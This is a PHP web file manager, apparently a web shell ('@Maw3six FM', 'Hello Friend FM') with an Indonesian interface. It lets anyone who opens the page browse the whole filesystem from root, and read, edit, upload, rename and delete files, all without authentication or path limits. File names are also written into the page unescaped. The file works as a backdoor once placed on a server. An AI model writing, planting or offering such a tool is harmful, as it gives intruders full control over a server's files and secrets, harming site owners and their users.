<?php
$directory = isset($_GET['dir']) && !empty($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;

if (!$directory || !is_dir($directory)) {
    $directory = __DIR__;
}

$files = array_diff(scandir($directory), array('.', '..'));

function getPermissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $power = $size > 0 ? floor(log($size, 1024)) : 0;
    return number_format($size / pow(1024, $power), 2, '.', ',') . ' ' . $units[$power];
}

$relativePath = str_replace('//', '/', $directory);
$breadcrumbs = explode('/', trim($relativePath, '/'));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_POST['action'] == 'edit') {
        $file = $directory . '/' . $_POST['file'];
        file_put_contents($file, $_POST['content']);
        exit("File berhasil disimpan!");
    } elseif ($_POST['action'] == 'upload') {
        $targetFile = $directory . '/' . basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
            exit("Upload berhasil!");
        } else {
            exit("Gagal upload!");
        }
    }
} elseif (isset($_GET['action'])) {
    if ($_GET['action'] == 'delete') {
        $file = $directory . '/' . $_GET['file'];
        if (is_file($file)) {
            unlink($file);
        } elseif (is_dir($file)) {
            rmdir($file);
        }
        exit("Berhasil dihapus!");
    } elseif ($_GET['action'] == 'rename') {
        $old = $directory . '/' . $_GET['old'];
        $new = $directory . '/' . $_GET['new'];
        rename($old, $new);
        exit("Berhasil diubah!");
    } elseif ($_GET['action'] == 'read') {
        $file = $directory . '/' . $_GET['file'];
        exit(is_file($file) ? file_get_contents($file) : "Gagal membaca file!");
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@Maw3six FM</title>
     <style> 
	@import url('https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@300;400;600&display=swap');
	 
	{
		margin: 0;
		padding: 0;
		box-sizing: border-box;
		font-family: Arial, sans-serif;
	}


    body {
        font-family: 'Chakra Petch', sans-serif;
		background: url('https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/hello-friends.webp') no-repeat center center fixed;
		background-size: cover;
		color: #ddd;
		padding: 20px;
		text-align: center;
	}
	
	/* Container utama */
	.container {
		max-width: 900px;
		margin: auto;
		background: rgba(20, 20, 20, 0.9);
		padding: 20px;
		box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
		border-radius: 20px;
	}
	
	/* Breadcrumb Navigation */
	.breadcrumb {
		background: rgba(50, 50, 50, 0.8);
		padding: 10px;
		border-radius: 5px;
		display: inline-block;
		margin-bottom: 15px;
	}
	
	.breadcrumb a {
		text-decoration: none;
		color: #777;
		font-weight: bold;
		margin-right: 5px;
	}
	
	.breadcrumb a:hover {
		text-decoration: underline;
		color: #777;
	}
	
	/* Tabel File Manager */
	table {
		width: 100%;
		border-collapse: collapse;
		margin-top: 15px;
	}
	
	table,
	th,
	td {
		border: 1px solid #555;
	}
	
	th,
	td {
		padding: 10px;
		text-align: left;
	}
	
	th {
		background: #333;
		color: #f1f1f1;
	}
	
	tr:nth-child(even) {
		background: rgba(50, 50, 50, 0.7);
	}
	
	tr:hover {
		background: rgba(80, 80, 80, 0.5);
	}
	
	/* Ikon File dan Folder */
	.folder a {
		color: #f39c12;
		text-decoration: none;
	}
	
	.file a {
		color: #3498db;
		text-decoration: none;
	}
	
	.folder a:hover,
	.file a:hover {
		text-decoration: underline;
	}
	
	/* Tombol Aksi */
	.actions {
		cursor: pointer;
		padding: 7px 12px;
		margin: 3px;
		background: #555;
		color: white;
		border-radius: 5px;
		display: inline-block;
		font-size: 14px;
		transition: 0.3s;
	}
	
	.actions:hover {
		background: #777;
	}
	
	/* Tombol Hapus */
	.actions.delete {
		background: #c0392b;
	}
	
	.actions.delete:hover {
		background: #e74c3c;
	}
	
	/* Modal untuk Edit File */
	.modal {
		display: none;
		position: fixed;
		top: 50%;
		left: 50%;
		transform: translate(-50%, -50%);
		background: rgba(20, 20, 20, 0.95);
		padding: 20px;
		box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
		border-radius: 5px;
		width: 80%;
		max-width: 600px;
		z-index: 1000;
		color: #fff;
	}
	
	.modal-content {
		text-align: left;
	}
	
	.modal textarea {
		width: 100%;
		height: 300px;
		padding: 10px;
		background: #222;
		color: #f1f1f1;
		border: 1px solid #555;
		border-radius: 5px;
		resize: vertical;
	}
	
	.modal button {
		padding: 10px 15px;
		border: none;
		background: #777;
		color: white;
		font-size: 16px;
		cursor: pointer;
		margin-top: 10px;
		border-radius: 5px;
	}
	
	.modal button:hover {
		background: #777;
	}
	
	/* Tombol Tutup Modal */
	.close {
		float: right;
		font-size: 20px;
		cursor: pointer;
		color: #e74c3c;
	}
	
	.close:hover {
		color: #ff0000;
	}
	
	/* Upload Form */
	#uploadForm {
		margin-top: 15px;
	}
	
	#uploadForm input[type="file"] {
		margin-right: 10px;
		color: #ddd;
	}
	
	#uploadForm button {
		padding: 7px 15px;
		border: none;
		background: #777;
		color: white;
		font-size: 14px;
		cursor: pointer;
		border-radius: 5px;
	}
	
	#uploadForm button:hover {
		background: #777;
	}
	
</style>
    <script>
        function ajaxRequest(url, method, data, callback) {
            let xhr = new XMLHttpRequest();
            xhr.open(method, url, true);
            xhr.onload = function () {
                if (xhr.status === 200) callback(xhr.responseText);
            };
            xhr.send(data);
        }

        function uploadFile() {
            let formData = new FormData(document.getElementById("uploadForm"));
            ajaxRequest("?dir=<?php echo urlencode($directory); ?>", "POST", formData, function (response) {
                alert(response);
                location.reload();
            });
        }

        function deleteFile(filename) {
            if (confirm("Yakin ingin menghapus " + filename + "?")) {
                ajaxRequest("?dir=<?php echo urlencode($directory); ?>&action=delete&file=" + encodeURIComponent(filename), "GET", null, function (response) {
                    alert(response);
                    location.reload();
                });
            }
        }

        function renameFile(oldName) {
            let newName = prompt("Masukkan nama baru:", oldName);
            if (newName) {
                ajaxRequest("?dir=<?php echo urlencode($directory); ?>&action=rename&old=" + encodeURIComponent(oldName) + "&new=" + encodeURIComponent(newName), "GET", null, function (response) {
                    alert(response);
                    location.reload();
                });
            }
        }

        function editFile(filename) {
            ajaxRequest("?dir=<?php echo urlencode($directory); ?>&action=read&file=" + encodeURIComponent(filename), "GET", null, function (response) {
                document.getElementById("editModal").style.display = "block";
                document.getElementById("fileContent").value = response;
                document.getElementById("editFilename").value = filename;
            });
        }

        function saveFile() {
            let filename = document.getElementById("editFilename").value;
            let content = document.getElementById("fileContent").value;
            let formData = new FormData();
            formData.append("action", "edit");
            formData.append("file", filename);
            formData.append("content", content);

            ajaxRequest("?dir=<?php echo urlencode($directory); ?>", "POST", formData, function (response) {
                alert(response);
                document.getElementById("editModal").style.display = "none";
                location.reload();
            });
        }

        function closeModal() {
            document.getElementById("editModal").style.display = "none";
        }
    </script>
</head>
<body>
<div class="container">
    <h2><a href="?dir=<?php echo urlencode(__DIR__); ?>" style="text-decoration: none; color: white;">Hello Friend FM</a></h2>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        <a href="?dir=/">Location :</a>
        <?php
        $path = '';
        foreach ($breadcrumbs as $crumb) {
            $path .= '/' . $crumb;
            echo '<a href="?dir=' . urlencode($path) . '">' . $crumb . '</a> ';
        }
        ?>
    </div>

    <form id="uploadForm" onsubmit="event.preventDefault(); uploadFile();" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <input type="hidden" name="action" value="upload">
        <button type="submit">Upload</button>
    </form>

    <table>
	<center>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Last Edit</th>
            <th>Permission</th>
            <th>Action</th>
        </tr>
		</center>
        <?php if ($directory !== '/'): ?>
            <tr>
                <td colspan="5"><a href="?dir=<?php echo urlencode(dirname($directory)); ?>">⬆..</a></td>
            </tr>
        <?php endif; ?>
        <?php foreach ($files as $file): 
            $filePath = $directory . '/' . $file;
        ?>
            <tr>
                <td><?php echo is_dir($filePath) ? "📁 <a href='?dir=" . urlencode($filePath) . "'>$file</a>" : "📄 $file"; ?></td>
                <td><?php echo is_file($filePath) ? formatSize(filesize($filePath)) : '-'; ?></td>
                <td><?php echo date("Y-m-d H:i:s", filemtime($filePath)); ?></td>
                <td><?php echo getPermissions($filePath); ?></td>
                <td>
                    <span class="actions" onclick="renameFile('<?php echo $file; ?>')">Rename</span>
                    <span class="actions" onclick="deleteFile('<?php echo $file; ?>')">Delete</span>
                    <?php if (is_file($filePath)): ?>
                        <span class="actions" onclick="editFile('<?php echo $file; ?>')">Edit</span>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>

    <div id="editModal" class="modal">
        <textarea id="fileContent"></textarea>
        <input type="hidden" id="editFilename">
        <button onclick="saveFile()">Save</button>
        <button onclick="closeModal()">Close</button>
    </div>
	</div>
</body>
</html>
